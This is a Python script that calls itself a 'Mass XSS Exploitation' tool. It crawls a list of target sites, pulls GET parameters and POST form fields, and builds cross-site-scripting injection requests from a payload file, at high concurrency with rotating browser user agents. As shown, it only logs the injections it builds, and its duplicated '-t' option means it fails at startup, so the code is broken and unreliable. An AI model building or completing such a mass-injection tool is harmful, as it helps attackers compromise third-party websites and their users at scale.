import aiohttp
import asyncio
import urllib.parse
from argparse import ArgumentParser
import random
import sys
from bs4 import BeautifulSoup
from colorama import Fore, Style

CONCURRENCY = 30
TIMEOUT = 20
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

def log(message, level="i"):
    levels = {
        "i": f"{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL}",
        "s": f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL}",
        "w": f"{Fore.LIGHTYELLOW_EX}[!]{Style.RESET_ALL}",
        "e": f"{Fore.LIGHTRED_EX}[-]{Style.RESET_ALL}",
    }
    print(f"{levels.get(level, levels['i'])} {message}")

def load_payloads(payloads_file: str) -> list:
    try:
        with open(payloads_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        log(f"Payloads file '{payloads_file}' not found!", "e")
        sys.exit(1)

def generate_injections(url: str, params: dict, payloads: list) -> list:
    injections = []
    
    if params.get('get'):
        for param in params['get']:
            for payload in payloads:
                parsed = urllib.parse.urlparse(url)
                query = urllib.parse.parse_qs(parsed.query)
                query[param] = [payload]
                new_query = urllib.parse.urlencode(query, doseq=True)
                injection_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                injections.append(('GET', injection_url))
    
    if params.get('post'):
        for form_url, form_data in params['post'].items():
            for param in form_data:
                for payload in payloads:
                    exploit_data = form_data.copy()
                    exploit_data[param] = payload
                    injections.append(('POST', form_url, param, payload, exploit_data))
    
    return injections

async def scan_target(session: aiohttp.ClientSession, target: str) -> dict:
    try:
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target

        async with session.get(target, allow_redirects=True) as response:
            final_url = str(response.url)
            parsed = urllib.parse.urlparse(final_url)
            
            get_params = urllib.parse.parse_qs(parsed.query)
            
            post_params = {}
            if 'html' in response.headers.get('Content-Type', '').lower():
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                for form in soup.find_all('form'):
                    if form.get('method', 'get').lower() == 'post':
                        form_url = urllib.parse.urljoin(final_url, form.get('action', ''))
                        inputs = {}
                        for inp in form.find_all(['input', 'textarea']):
                            if inp.get('name'):
                                inputs[inp.get('name')] = inp.get('value', '')
                        if inputs:
                            post_params[form_url] = inputs
            
            return {'get': get_params, 'post': post_params}
    
    except aiohttp.ClientError as e:
        log(f"Network error scanning {target}: {str(e) or 'Unknown network error'}", "e")
    except asyncio.TimeoutError:
        log(f"Timeout while scanning {target}", "e")
    except Exception as e:
        log(f"Unexpected error scanning {target}: {str(e) or type(e).__name__}", "e")

async def process_target(session: aiohttp.ClientSession, target: str, payloads: list, stats: dict):
    params = await scan_target(session, target)
    if not params:
        stats['failed'] += 1
        return

    stats['scanned'] += 1
    injections = generate_injections(target, params, payloads)
    
    for injection in injections:
        stats['injected'] += 1
        if injection[0] == 'GET':
            log(f"GET injection: {injection[1]}", "s")
        else:
            log(f"POST injection to {injection[1]} - {injection[2]}={injection[3]}", "s")

async def run_injector(targets: list, payloads: list, concurrency: int, timeout: int):
    stats = {'scanned': 0, 'injected': 0, 'failed': 0}
    
    connector = aiohttp.TCPConnector(limit=concurrency, force_close=True)
    timeout = aiohttp.ClientTimeout(total=timeout)
    
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        headers={'User-Agent': random.choice(USER_AGENTS)}
    ) as session:
        tasks = []
        for target in targets:
            tasks.append(asyncio.create_task(process_target(session, target, payloads, stats)))
        
        await asyncio.gather(*tasks)
    
    log("Injection summary:", "i")
    log(f"Scanned targets: {stats['scanned']}", "i")
    log(f"Injection attempts: {stats['injected']}", "i")
    log(f"Failed targets: {stats['failed']}", "i")

def main():
    parser = ArgumentParser(description="Mass XSS Exploitation")
    parser.add_argument("-t", "--targets", required=True, help="File containing target URLs")
    parser.add_argument("-p", "--payloads", required=True, help="File containing XSS payloads")
    parser.add_argument("-c", "--concurrency", type=int, default=30, 
                       help=f"Concurrent requests (default: 30)")
    parser.add_argument("-t", "--timeout", type=int, default=20,
                       help=f"Request timeout in seconds (default: 20)")
    
    args = parser.parse_args()
    
    try:
        with open(args.targets) as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        log(f"Targets file '{args.targets}' not found!", "e")
        sys.exit(1)
    
    payloads = load_payloads(args.payloads)
    
    log(f"Starting injection on {len(targets)} targets", "i")
    log(f"Using {len(payloads)} payloads", "i")
    log(f"Concurrency: {args.concurrency}", "i")
    log(f"Timeout: {args.timeout}s\n", "i")
    
    asyncio.run(run_injector(targets, payloads, args.concurrency, args.timeout))

if __name__ == "__main__":
    main()